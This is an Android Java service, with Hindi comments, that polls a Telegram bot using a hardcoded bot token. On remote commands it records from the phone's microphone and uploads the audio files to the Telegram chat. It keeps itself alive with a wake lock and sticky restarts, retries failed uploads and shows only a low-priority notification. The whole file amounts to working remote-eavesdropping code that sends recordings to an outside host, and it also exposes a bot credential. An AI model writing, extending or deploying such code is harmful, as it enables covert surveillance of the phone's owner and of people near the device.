package com.example.listener;

import android.app.*;
import android.content.*;
import android.media.MediaRecorder;
import android.os.*;
import android.util.Log;
import androidx.core.app.NotificationCompat;

import okhttp3.*;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;

public class ListenerService extends Service {
    private static final String TAG = "Listener";
    private static final String TOKEN = "9237412404:AAFOGqcDN-w1LZV36GnztszDBSfIAvBIBuw";
    private static final String BASE  = "https://api.telegram.org/bot" + TOKEN + "/";
    private static final String PREFS = "listener_prefs";
    private static final String KEY_UPD = "last_update_id";
    private static final int    KEEP  = 20;  // 20 सफल फाइलें रखें, बाकी हटें

    private final OkHttpClient http = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(70, TimeUnit.SECONDS)
            .writeTimeout(120, TimeUnit.SECONDS)
            .build();

    private volatile boolean running = false;
    private MediaRecorder recorder;
    private File currentFile;
    private String currentChat;
    private File audioDir;
    private PowerManager.WakeLock wakeLock;

    @Override public void onCreate() {
        super.onCreate();
        audioDir = new File(getExternalFilesDir(null), "audio");
        audioDir.mkdirs();
        createChannel();
        startForeground(1, notif("Listener चालू है"));
        acquireWake();
        running = true;
        new Thread(this::pollLoop, "tg-poll").start();
        new Thread(this::retryPending, "retry").start();
    }

    @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
    @Override public void onDestroy() {
        running = false;
        safeStop();
        releaseWake();
        super.onDestroy();
    }

    // ---------- WAKE LOCK ----------
    private void acquireWake() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Listener::wl");
                wakeLock.acquire();
            }
        } catch (Exception e) { Log.e(TAG, "wake", e); }
    }
    private void releaseWake() {
        try { if (wakeLock != null && wakeLock.isHeld()) wakeLock.release(); } catch (Exception ignored) {}
    }

    // ---------- POLL LOOP ----------
    private void pollLoop() {
        SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
        long lastId = sp.getLong(KEY_UPD, 0);
        while (running) {
            try {
                String url = BASE + "getUpdates?timeout=30&offset=" + (lastId + 1);
                Request req = new Request.Builder().url(url).build();
                try (Response resp = http.newCall(req).execute()) {
                    if (resp.isSuccessful() && resp.body() != null) {
                        JSONObject j = new JSONObject(resp.body().string());
                        JSONArray arr = j.optJSONArray("result");
                        if (arr != null) for (int i = 0; i < arr.length(); i++) {
                            JSONObject u = arr.getJSONObject(i);
                            lastId = u.optLong("update_id", lastId);
                            sp.edit().putLong(KEY_UPD, lastId).apply();
                            safeHandle(u);
                        }
                    }
                }
            } catch (Exception e) { Log.e(TAG, "poll", e); }
            try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
        }
    }

    private void safeHandle(JSONObject upd) {
        try {
            JSONObject m = upd.optJSONObject("message");
            if (m == null) return;
            String text = m.optString("text", "").trim().toLowerCase();
            String chatId = m.getJSONObject("chat").getString("id");

            if (text.equals("/record") || text.equals("record")) {
                if (recorder == null) { startRec(chatId); sendText(chatId, "🎙️ रिकॉर्डिंग शुरू"); }
                else sendText(chatId, "पहले से रिकॉर्ड हो रहा है");
            } else if (text.equals("/stop") || text.equals("stop")) {
                if (recorder != null) { stopRec(chatId); }
                else sendText(chatId, "अभी रिकॉर्डिंग नहीं है");
            } else if (text.equals("/status") || text.equals("status")) {
                sendText(chatId, recorder != null ? "🔴 रिकॉर्डिंग चल रही है" : "⚪ नहीं चल रही");
            }
        } catch (Exception e) { Log.e(TAG, "handle", e); }
    }

    // ---------- RECORD ----------
    private void startRec(String chatId) {
        try {
            currentChat = chatId;
            // P_ = pending (भेजने बाकी)
            currentFile = new File(audioDir, "P_" + chatId + "_" + System.currentTimeMillis() + ".m4a");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioEncodingBitRate(64000);
            recorder.setAudioSamplingRate(44100);
            recorder.setOutputFile(currentFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
        } catch (Exception e) {
            Log.e(TAG, "startRec", e);
            safeStop();
            sendText(chatId, "❌ रिकॉर्डिंग शुरू नहीं हो सकी");
        }
    }

    private void safeStop() {
        try {
            if (recorder != null) {
                try { recorder.stop(); } catch (Exception ignored) {}
                recorder.release();
            }
        } catch (Exception ignored) {}
        recorder = null;
    }

    private void stopRec(String chatId) {
        safeStop();
        final File f = currentFile;
        if (f == null || !f.exists()) return;
        currentFile = null;
        new Thread(() -> {
            if (uploadAudio(chatId, f)) {
                f.renameTo(new File(audioDir, "S_" + f.getName().substring(2)));
                cleanupOld();
                sendText(chatId, "✅ ऑडियो भेज दिया गया");
            } else {
                sendText(chatId, "⚠️ भेजना नाकाम — अगली बार ऐप खुलने पर दोबारा कोशिश होगी");
            }
        }, "upload").start();
    }

    private boolean uploadAudio(String chatId, File f) {
        try { if (sendFile(chatId, f, "sendVoice", "voice")) return true; } catch (Exception ignored) {}
        try { if (sendFile(chatId, f, "sendAudio", "audio")) return true; } catch (Exception ignored) {}
        return false;
    }

    private boolean sendFile(String chatId, File f, String method, String field) throws Exception {
        RequestBody fb = RequestBody.create(f, MediaType.parse("audio/mp4"));
        MultipartBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart(field, f.getName(), fb)
                .build();
        Request req = new Request.Builder().url(BASE + method).post(body).build();
        try (Response r = http.newCall(req).execute()) { return r.isSuccessful(); }
    }

    // ---------- BACKUP / RETRY ----------
    private void retryPending() {
        try {
            File[] arr = audioDir.listFiles(p -> p.getName().startsWith("P_"));
            if (arr == null) return;
            for (File f : arr) {
                try {
                    String cid = f.getName().split("_")[1];
                    if (uploadAudio(cid, f)) {
                        f.renameTo(new File(audioDir, "S_" + f.getName().substring(2)));
                        sendText(cid, "📤 पुरानी रिकॉर्डिंग भेज दी गई");
                    }
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
    }

    private void cleanupOld() {
        try {
            File[] sent = audioDir.listFiles(p -> p.getName().startsWith("S_"));
            if (sent == null || sent.length <= KEEP) return;
            Arrays.sort(sent, (a, b) -> Long.compare(a.lastModified(), b.lastModified()));
            for (int i = 0; i < sent.length - KEEP; i++) sent[i].delete();
        } catch (Exception ignored) {}
    }

    // ---------- SEND TEXT ----------
    private void sendText(String chatId, String text) {
        new Thread(() -> {
            try {
                RequestBody body = new FormBody.Builder()
                        .add("chat_id", chatId).add("text", text).build();
                http.newCall(new Request.Builder().url(BASE + "sendMessage").post(body).build()).execute().close();
            } catch (Exception ignored) {}
        }).start();
    }

    // ---------- NOTIF ----------
    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("lst", "Listener", NotificationManager.IMPORTANCE_LOW);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification notif(String t) {
        return new NotificationCompat.Builder(this, "lst")
                .setContentTitle("Telegram Listener")
                .setContentText(t)
                .setSmallIcon(android.R.drawable.ic_btn_speak_now)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }
}
